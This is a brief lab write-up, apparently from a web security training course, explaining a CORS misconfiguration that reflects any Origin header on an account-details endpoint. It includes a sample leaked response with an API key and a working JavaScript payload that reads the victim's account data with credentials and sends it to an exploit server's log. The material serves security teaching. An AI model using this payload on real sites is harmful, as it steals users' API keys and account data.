# CORS vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins.

When an Origin header with any value is added to requests to `/accountDetails`, the application echoes it in the `Access-Control-Allow-Origin` response header.

```http
GET /accountDetails HTTP/1.1

Origin: https://random-website.com
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://random-website.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "jFjdQBJldim1j7cv1Zm8C0BiImuskK5U",
  "sessions": [
    "2K43vdr9uBieBO6hKPxign5cBBk0RkHv"
  ]
}
```

The following payload, delievered to the user, can be used to log their api key in the lab's exploit server:

```javascript
var xhr = new XMLHttpRequest()
var url = 'https://acb81fbb1f7d870ec0f52ab300bf0064.web-security-academy.net'

xhr.onreadystatechange = function () {
  if (xhr.readyState == XMLHttpRequest.DONE) {
    fetch('/log?key=' + xhr.responseText)
  }
}

xhr.open('GET', url + '/accountDetails', true)
xhr.withCredentials = true

xhr.send(null)
```
